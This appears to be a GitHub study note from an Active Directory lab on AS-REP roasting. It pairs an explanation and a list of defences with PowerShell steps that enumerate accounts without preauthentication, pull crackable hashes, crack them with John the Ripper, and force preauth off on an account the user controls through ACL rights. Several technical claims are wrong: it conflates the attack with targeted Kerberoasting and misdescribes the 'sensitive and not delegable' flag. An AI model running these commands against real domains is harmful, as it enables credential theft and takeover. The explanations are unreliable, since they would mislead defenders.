# Targeted Kerberoasting (AS-REPs Attack)

**Targeted Kerberoasting**, also known as the **AS-REPs attack**, is a specific type of Kerberoasting that focuses on high-value user accounts in an Active Directory (AD) environment. Unlike regular Kerberoasting, which targets service accounts with Service Principal Names (SPNs), the AS-REPs attack targets user accounts with particular configurations, such as the **"sensitive and not delegable"** flag, or user accounts that have **Kerberos preauthentication** disabled.

### How the AS-REPs Attack Works

1. **Identifying Vulnerable Accounts**:  
   The AS-REPs attack specifically targets **user accounts** that are flagged as **sensitive and not delegable**. This flag means the user's **Kerberos Ticket Granting Service (TGS)** request cannot be delegated to another service. These accounts are often high-value targets, such as domain administrators or other privileged users.

2. **Requesting the AS Ticket**:  
   Once the attacker identifies the target user account, the next step is to request an **Authentication Service (AS)** ticket from the domain controller for the targeted user. This request contains the user's password hash, encrypted with the user's password.

3. **Cracking the Password Hash**:  
   The attacker then uses brute-force techniques to crack the hashed password contained in the AS ticket. This step is done offline, and if successful, the attacker will obtain the plaintext password for the user account.

4. **Exploiting the Password**:  
   With the plaintext password, the attacker can gain unauthorized access to the user account, potentially compromising the network or escalating privileges to domain admin rights.

### Vulnerable Accounts: What Makes Them Targets?

- **Sensitive and Not Delegable Flag**:  
  When a user account has the "sensitive and not delegable" flag set, it indicates that Kerberos tickets for this account cannot be delegated. These accounts are generally considered more secure due to the restricted delegation, but if an attacker can obtain the AS ticket, it can be cracked offline.

- **Disabled Kerberos Preauthentication**:  
  If a user account has **Kerberos preauthentication disabled**, it is possible for an attacker to retrieve a **crackable AS-REP** (Authentication Service Response), which can then be brute-forced offline. Disabling Kerberos preauthentication weakens the overall security of the account because it allows attackers to extract password hashes without needing any valid authentication attempts.

- **Privileges Required to Disable Kerberos Preauthentication**:  
  If an attacker has sufficient rights, such as **GenericWrite** or **GenericAll**, they can **disable Kerberos preauthentication** for the target account. This allows the attacker to more easily retrieve and crack the AS-REP ticket for that account.

### How to Prevent AS-REPs Attacks

To prevent AS-REPs attacks, organizations should take the following precautions:

1. **Properly Secure High-Value Accounts**:  
   Ensure that high-value user accounts, such as domain administrators, are properly secured. These accounts should be treated as highly sensitive and should be protected with strong passwords and multi-factor authentication where possible.

2. **Disable "Sensitive and Not Delegable" Flag When Appropriate**:  
   If user accounts do not require this level of security, consider disabling the "sensitive and not delegable" flag. However, for high-privilege accounts, this flag should remain enabled to prevent delegation vulnerabilities.

3. **Enforce Kerberos Preauthentication**:  
   Always enable **Kerberos preauthentication** for all user accounts, especially privileged ones. This adds an additional layer of security by requiring the user to authenticate before requesting a Kerberos ticket, making it more difficult for attackers to retrieve the ticket and crack the password hash.

4. **Monitor for Suspicious Activity**:  
   Implement robust monitoring to detect unusual authentication patterns or unauthorized changes to user accounts (e.g., enabling/disabling Kerberos preauthentication). Alerts should be set up for suspicious changes or failed authentication attempts.

5. **Use Strong Passwords and Access Controls**:  
   Implement strong password policies and ensure proper access controls are in place to limit who can modify sensitive user accounts. This reduces the risk of attackers gaining access to high-value user accounts through brute-force attacks.

6. **Limit Rights to Modify Account Settings**:  
   Ensure that only trusted administrators or systems have the ability to modify the **UserAccountControl** settings for sensitive user accounts, particularly disabling Kerberos preauthentication.

---

### Key Points for AS-REPs Attack:

- **Kerberos preauthentication** must be enabled to prevent attackers from obtaining crackable AS-REPs.
- Accounts with the **"sensitive and not delegable"** flag set are prime targets for AS-REPs attacks.
- **GenericWrite** or **GenericAll** privileges can allow an attacker to disable Kerberos preauthentication, enabling the AS-REPs attack.
- Regularly review and audit user account security settings to mitigate these risks.

---

### Conclusion

Targeted Kerberoasting (AS-REPs) is a powerful attack technique that focuses on high-value user accounts. By disabling Kerberos preauthentication or targeting accounts with the "sensitive and not delegable" flag, attackers can easily obtain and crack user password hashes offline. Organizations can protect themselves from this attack by enforcing strong security policies, monitoring for suspicious activity, and ensuring that Kerberos preauthentication is enabled for all accounts.

![image](https://github.com/user-attachments/assets/b0d7705f-69ef-4f3c-8ee4-4853fcabbf5c)

# Enumerate Users with Kerberos Preauth Disabled

Using the PowerView dev version, we can enumerate users with Kerberos preauth disabled.

## Load PowerView Dev and Enumerate Users
```powershell
PS C:\AD\Tools> . .\PowerView_dev.ps1
PS C:\AD\Tools> Get-DomainUser -PreauthNotRequired -Verbose
PS C:\AD\Tools\kerberoast> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

## Request the Crackable Encrypted Part Using ASREPRoast

Next, we can use `Get-ASREPHash` from ASREPRoast to request the crackable encrypted part.
```powershell
PS C:\AD\Tools> . .\ASREPRoast-master\ASREPRoast-master\ASREPRoast.ps1
PS C:\AD\Tools> Get-ASREPHash -UserName VPN157user -Verbose
```

## Brute-Force the Encrypted Blob Offline Using John The Ripper

We can brute-force the encrypted blob offline using John The Ripper (bleeding-jumbo version).
```bash
./john vpnxuser.txt --wordlist=wordlist.txt
```

# Misconfiguration Service

## Enumerate Users with Generic Write or GenericAll Rights

Now, let’s enumerate those users where `student157` has Generic Write or GenericAll rights. Since `student157` is a part of the RDP Users group:
```powershell
PS C:\AD\Tools> . .\PowerView_dev.ps1
PS C:\AD\Tools> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
```

## Set Preauth Not Required for Control157User

Since RDPUsers has GenericAll rights over `Control157user`, let’s force set preauth not required to `Control157User`'s `UserAccountControl` settings.
```powershell
PS C:\AD\Tools> Set-DomainObject -Identity Control157User -XOR @{useraccountcontrol=4194304} -Verbose
PS C:\AD\Tools> Get-DomainUser -PreauthNotRequired -Identity Control157User
```

## Request the Crackable Encrypted Part Again

Next, we can use `Get-ASREPHash` from ASREPRoast to request the crackable encrypted part, as done earlier.
```powershell
PS C:\AD\Tools> Get-ASREPHash -UserName Control157User -Verbose
```

This should help make the process of discovering users with Kerberos preauth disabled and exploiting misconfigurations more organized and readable for GitHub!

![image](https://github.com/user-attachments/assets/115f89a7-6191-4349-b4c9-2ab6b626559b)

![image](https://github.com/user-attachments/assets/5a44192f-6c9b-4dfa-bde1-a6b68c28a56c)

![image](https://github.com/user-attachments/assets/159fd1f9-101a-4688-ab28-54696ab6c5fd)

![image](https://github.com/user-attachments/assets/8e169921-bcf6-4e63-9c61-5f585ede3281)

ACS Enabled:

![image](https://github.com/user-attachments/assets/303a3518-991d-488d-a1b3-a34dbf963952)

![image](https://github.com/user-attachments/assets/4a4b1225-7b79-4861-aaca-9ba1f51a6a3d)

![image](https://github.com/user-attachments/assets/7e08ba7d-c580-4126-adb8-c2a9fdd4adec)

![image](https://github.com/user-attachments/assets/84e77f80-dbc9-41ca-bd09-5924f5904b68)

![image](https://github.com/user-attachments/assets/556f85c5-247d-49b5-8ae2-fce3a04fd5b5)

![image](https://github.com/user-attachments/assets/004ffbc6-1028-463c-b250-67ba347c5af5)

Different types of Kerberoasting as-reps 

![image](https://github.com/user-attachments/assets/ad9deee1-df30-4b1e-9f2d-3cca027a461c)

![image](https://github.com/user-attachments/assets/ee8711a7-0df7-4804-9037-6cee00be24ef)

![image](https://github.com/user-attachments/assets/84b56f28-646c-4db9-a9ae-c26a9200953c)

![image](https://github.com/user-attachments/assets/98045bb8-6dfa-41e8-af3a-882d4b0da7c5)

## With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain). 
## We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

![image](https://github.com/user-attachments/assets/1bad5245-f8b7-4e38-a773-871597b9cd80)

![image](https://github.com/user-attachments/assets/7862aec6-0268-451f-9c02-dd2c18dba46e)

![image](https://github.com/user-attachments/assets/f8725f33-a8ac-4e89-b96b-5ecfd451eb2c)




